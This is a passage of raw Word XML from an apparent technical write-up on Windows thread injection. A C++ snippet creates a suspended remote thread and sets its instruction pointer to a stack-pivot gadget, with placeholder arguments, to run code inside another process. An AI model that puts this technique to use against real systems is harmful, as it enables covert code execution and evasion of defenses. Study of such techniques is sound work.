    </w:p>
    <w:p w14:paraId="17779E26" w14:textId="015D6A5B" w:rsidR="003D7792" w:rsidRPr="004B4AA4" w:rsidRDefault="003D7792" w:rsidP="00C754FE">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>We will simply set up the new thread’s stack to return from this to the target address, and store RSP in r11.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FACB34" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A527AF5" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>void</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> moduleInMemory::injectThread(</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> startRVA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5943E683" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEF23CE" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>long</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> entrypointBased = targetModuleBase + entrypoint;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3D651D" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">HANDLE s = CreateRemoteThread(targetProcess, NULL, </w:t>
      </w:r>
      <w:r w:rsidR="00385855" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00385855" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, 0, CREATE_SUSPENDED, &amp;tid);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575CC3C1" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!s) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCEA220" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2E6564" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>CONTEXT ctx;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F476E9" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01828A5C" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!GetThreadContext(s, &amp;ctx)) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0802AA5E" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="694E7B70" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">ctx.Rip = </w:t>
      </w:r>
      <w:r w:rsidR="003D7792" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>findStackPivot()</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E2723D" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ctx.Rcx = &lt;argument 1&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4445313A" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ctx.Rdx = &lt;argument 2&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7E5836" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="00385855" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ctx.R8 </w:t>
      </w:r>
      <w:r w:rsidR="003D7792" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>= &lt;argument 3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630AEDCD" w14:textId="77777777" w:rsidR="00385855" w:rsidRPr="004B4AA4" w:rsidRDefault="003D7792" w:rsidP="00385855">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ctx.R11</w:t>
      </w:r>
      <w:r w:rsidR="00385855" w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>&lt;thread’s new stack&gt; - 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3551B7AD" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B003866" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!SetThreadContext(s, &amp;ctx)) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72805EA5" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="004B4AA4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (ResumeThread(s) == -1) { ... }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BBC59F" w14:textId="77777777" w:rsidR="009B6CAE" w:rsidRPr="004B4AA4" w:rsidRDefault="009B6CAE" w:rsidP="009B6CAE">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
